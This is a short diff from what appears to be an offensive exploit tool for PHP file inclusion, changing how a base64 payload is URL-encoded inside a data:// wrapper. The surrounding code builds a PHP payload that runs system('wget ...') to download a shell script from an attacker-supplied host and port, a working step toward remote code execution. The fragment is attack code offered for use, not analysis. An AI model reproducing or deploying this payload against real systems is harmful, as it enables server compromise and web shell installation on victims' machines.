@@ -74,7 +74,7 @@ class Data:
                 payload_file.close()
             else:
                 payload = "<?php system('wget http://{0}:8000/{1}.php'); ?>".format(lhost, shell)
-            encoded_payload = payload.encode('base64')
+            encoded_payload = payload.encode('base64').replace("/","%2f").replace("+","%2b")
 
             # Build data wrapper
             data_wrapper = "data://text/html;base64,{0}".format(encoded_payload)
